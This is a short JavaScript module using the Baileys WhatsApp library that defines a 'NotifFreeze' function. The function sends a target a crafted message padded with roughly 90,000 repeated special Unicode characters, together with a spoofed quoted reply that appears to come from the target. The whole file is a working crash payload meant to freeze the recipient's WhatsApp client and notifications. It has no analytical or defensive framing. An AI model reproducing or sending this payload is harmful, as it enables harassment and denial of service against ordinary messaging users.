import { generateWAMessageFromContent } from "@whiskeysockets/baileys";

export default async function NotifFreeze(sock, target) {
    // Remplacez 'surz' par 'sock'
    await sock.relayMessage(
        target,
        {
          extendedTextMessage: {
            text: "lionel9b.com" + "࣯ꦾ".repeat(90000),
            contextInfo: {
              fromMe: false,
              stanzaId: target,
              participant: target,
              quotedMessage: {
                conversation: "Neobest.cloud.com" + "ꦾ".repeat(90000),
              },
              disappearingMode: {
                initiator: "CHANGED_IN_CHAT",
                trigger: "CHAT_SETTING",
              },
            },
            inviteLinkGroupTypeV2: "DEFAULT",
          },
        },
        {
          participant: {
            jid: target,
          },
        },
        {
          messageId: null,
        }
      );
    }